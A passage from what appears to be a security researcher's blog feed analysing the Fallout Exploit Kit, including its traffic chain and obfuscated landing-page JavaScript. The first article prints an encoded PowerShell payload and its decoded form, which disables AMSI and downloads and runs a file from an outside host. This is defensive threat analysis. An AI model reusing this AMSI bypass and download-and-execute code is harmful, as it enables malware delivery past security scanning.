DEAOQA1ADAALQAwADEALQAxADEALwBPADgAWgByACcAOwBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgBHAE4AcwBhAFQAMABvAFQAbQBWADMATABVADkAaQBhAG0AVgBqAGQAQwBCAE8AWgBYAFEAdQBWADIAVgBpAFEAMgB4AHAAWgBXADUAMABLAFQAcwBrAFkAMgB4AHAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASgAxAFYAegBaAFgASQB0AFEAVwBkAGwAYgBuAFEAbgBYAFQAMABuAFMAagBVADMAVQBEAGwANQBNAFcAawB6AE0ARQAwAHgATQBEAEoAWQBOAFMAYwA3AEoARwBOAHMAYQBTADUARQBiADMAZAB1AGIARwA5AGgAWgBFAFoAcABiAEcAVQBvAEoARQBrAHgAYgBEAEUAeABTAFQARQBzAEoARwB4AHMAYgBEAEYASgBiAEcAeABKAE0AUwBrADcAJwApACkAfABpAGUAeAA7ACQASQAxAEkAMQBsADEASQBJAGwAbABJADEAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbABJADEAbABsADEASQBsADEASQAxAGwAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBsAEkASQAxAD0AMAB4ADAAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBJAEkAbABJAD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUwBpAHoAZQBPAGYAKAAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACkAOwAkAEkASQBsADEASQBsADEASQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQA7AFsAbAAxAEkAbAAxADEASQBJAEkAXQA6ADoAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoACQAbABsAGwAMQBJAGwAbABJADEALAAkAGwAbABsADEASQBsAGwASQAxACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAJABmAGEAbABzAGUALAAwAHgAMAAwADAAMAAwADAAMAA4ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIgBjADoAIgAsAFsAcgBlAGYAXQAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACwAWwByAGUAZgBdACQASQBJAGwAMQBJAGwAMQBJACkAfABvAHUAdAAtAG4AdQBsAGwAOwA</span><span class="o">=</span><span class="w">
</span></code></pre></div></div>

<p>Let’s decode and clean.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$l1Il1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="p">;</span><span class="w">
    </span><span class="nv">$l1Il1lI1IIl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1lI1IIl</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"amsiInitFailed"</span><span class="p">,</span><span class="w"> </span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$true</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">};</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"using System;using System.Diagnostics;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]public struct I1lII1Il1{public IntPtr IIlI1;public IntPtr lIl1I1II1l;public uint IIIIIlII;public uint Il111lIl1I1I;}[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct lI1ll1Il1I1l{public uint IIIlI;public string Il1l1;public string lI1ll;public string Il111IIIl;public uint I1lIl1ll1I;public uint IlIIIl1;public uint ll11Ill;public uint Il1IlIl1;public uint lIlIII;public uint lI1lIlI;public uint lI1l11;public uint Ill1Il;public short IlII1;public short IllIll;public IntPtr llIlIlIlI;public IntPtr Ill1IlIlI;public IntPtr IllIlllI1I1;public IntPtr I1III;};public static class l1Il11III{[DllImport(""kernel32.dll"",SetLastError=true)]public static extern bool CreateProcess(string IIlIII,string IlIlI,IntPtr I11l1I,IntPtr l1lI1,bool IlI11II1111,uint l111I,IntPtr lIII1IllI,string I1Il1lI,ref lI1ll1Il1I1l ll11IIl1I,out I1lII1Il1 lII1II);}"</span><span class="p">;</span><span class="w">

</span><span class="nv">$lll1IllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\AppData\LocalLow\</span><span class="si">$(</span><span class="o">-join</span><span class="p">((</span><span class="mi">48</span><span class="o">..</span><span class="mi">57</span><span class="si">)</span><span class="s2">+(65..90)+(97..122)|Get-Random -Count 8|%{[char]</span><span class="bp">$_</span><span class="s2">})).tmp"</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1l11I1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://beahero4u.com/1950-01-11/O8Zr'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">);</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="n">Headers</span><span class="p">[</span><span class="s1">'User-Agent'</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'J57P9y1i30M102X5'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$I1l11I1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">lI1ll1Il1I1l</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IlII1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IIIlI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$I1I1l1IIllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$IIl1Il1I</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">I1lII1Il1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">l1Il11III</span><span class="p">]::</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00000008</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"c:"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$I1I1l1IIllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$IIl1Il1I</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">out-null</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>Thus the malware is downloaded and executed.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Fallout has been heavily updated, making analysis very difficult. Very sophisticated techniques such as Diffie-Hellman key exchange, VM detection, process detection, etc. are used. We need to be careful as they may be updated in the future.</p>
]]></content:encoded>
<pubDate>2019-07-09T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analysis of Fallout Exploit Kit v3</title>
<link>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</link>
<guid>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We already tweeted, but the Fallout Exploit Kit has been updated. In the new Fallout, the traffic chain, obfuscation method of landing page and shellcode are changing. We will introduce details on the changes using <a href="http://malware-traffic-analysis.net/2019/02/28/index.html">Malware-Traffic-Analysis.net’s saz file</a>.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">New <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a> is using PoC on GitHub!<br />(CC: <a href="https://twitter.com/kafeine?ref_src=twsrc%5Etfw">@kafeine</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>)<a href="https://t.co/L1J5QOwJWn">https://t.co/L1J5QOwJWn</a><a href="https://t.co/ehhwtQqC5j">https://t.co/ehhwtQqC5j</a><a href="https://t.co/7opIhvSxg4">https://t.co/7opIhvSxg4</a> <a href="https://t.co/sJ1ESYpxbv">pic.twitter.com/sJ1ESYpxbv</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1100931219242442752?ref_src=twsrc%5Etfw">2019年2月28日</a></blockquote>


<h2 id="traffic">Traffic</h2>
<p>As usual HookAds Campaign will reach the landing page of Fallout and the attack will start. The flow of traffic is like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<h2 id="landing-page">Landing Page</h2>
<p>Let’s read the JavaScript on the landing page. Firstly, the objects necessary for decoding are defined.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">OygitP9</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">fZ2S0q</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">cMa5g</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span><span class="p">,</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">p2Z2Fkoy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">P1mnrrMi834</span><span class="p">(</span><span class="nx">MQVCd</span><span class="p">);</span> <span class="nx">p2Z2Fkoy</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">b8j5WMF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">negriNm4A3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">negriNm4A3</span><span class="p">)</span> <span class="p">?</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span> <span class="p">:</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span><span class="p">),</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">m3Z1Kc</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">T82SkC</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">OcKyWsdOFyq</span>
    <span class="p">},</span>
    <span class="na">jbRyz</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))),</span> <span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">b8j5WMF</span><span class="p">),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">qT8fpZ1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">)),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">m3Z1Kc</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">quSjT4yyl</span><span class="p">(</span><span class="nx">T82SkC</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">P1mnrrMi834</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">\r\n</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">);</span>
            <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="mi">127</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">2048</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">192</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">224</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">|</span> <span class="mi">128</span><span class="p">)),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span> <span class="o">|</span> <span class="mi">128</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">},</span>
    <span class="na">quSjT4yyl</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">UK1Az5</span> <span class="o">=</span> <span class="nx">zxh4w4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">),</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">:</span> <span class="mi">191</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">224</span> <span class="p">?</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">31</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">c3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="p">(</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">c3</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next defined object is also for decoding.</p>

